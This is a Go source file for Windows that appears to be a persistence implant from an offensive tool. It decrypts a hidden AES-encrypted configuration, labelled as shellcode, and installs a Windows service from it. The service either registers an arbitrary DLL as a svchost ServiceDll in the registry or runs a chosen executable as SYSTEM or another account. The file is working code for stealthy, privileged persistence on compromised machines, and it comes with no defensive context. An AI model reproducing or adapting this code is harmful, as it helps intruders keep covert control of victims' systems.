//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"

	"github.com/kardianos/service"
	"golang.org/x/sys/windows/registry"
)

//go:embed encrypt.txt
var encryptionKey string

var robin string
var RobinConfig ServiceConfig

type ServiceConfig struct {
	Name        string
	Description string
	Path        string
	DLL         bool
	RunAs       string
	Password    string
}

func decrypt(encryptionKey string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(robin)
	h := sha256.New()
	h.Write([]byte(encryptionKey))
	block, _ := aes.NewCipher(h.Sum(nil))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := decoded[:nonceSize], decoded[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func setRegistry(serviceName string, exePath string) {
	fullRegKey := fmt.Sprintf("SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName)
	key, _, _ := registry.CreateKey(registry.LOCAL_MACHINE, fullRegKey, registry.WRITE)
	defer key.Close()

	key.SetStringValue("ServiceDll", exePath)
}

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}
func (p *program) run() {
	cmd := exec.Command(RobinConfig.Path)
	err := cmd.Run()

	if err != nil {
		fmt.Println(err)
	}
}
func (p *program) Stop(s service.Service) error {
	return nil
}

func (p *program) Install(s service.Service) error {
	s.Install()
	return nil
}

func main() {
	decrypted := decrypt(encryptionKey)
	json.Unmarshal(decrypted, &RobinConfig)

	var c *service.Config

	if RobinConfig.DLL {
		c = &service.Config{
			Name:        RobinConfig.Name,
			DisplayName: RobinConfig.Name,
			Description: RobinConfig.Description,
			Executable:  `C:\Windows\System32\svchost.exe`,
		}
	} else if RobinConfig.RunAs == "SYSTEM" {
		c = &service.Config{
			Name:        RobinConfig.Name,
			DisplayName: RobinConfig.Name,
			Description: RobinConfig.Description,
		}
	} else {
		c = &service.Config{
			Name:        RobinConfig.Name,
			DisplayName: RobinConfig.Name,
			Description: RobinConfig.Description,
			UserName:    RobinConfig.RunAs,
			Option:      service.KeyValue{"Password": RobinConfig.Password},
		}
	}
	prg := &program{}
	s, err := service.New(prg, c)

	if err != nil {
		log.Println(err)
	}
	status, _ := s.Status()
	if status == service.StatusUnknown {
		prg.Install(s)
		if RobinConfig.DLL {
			setRegistry(RobinConfig.Name, RobinConfig.Path)
			os.Exit(0)
		}
	} else {
		err = s.Run()
		if err != nil {
			log.Println(err)
		}
	}
}
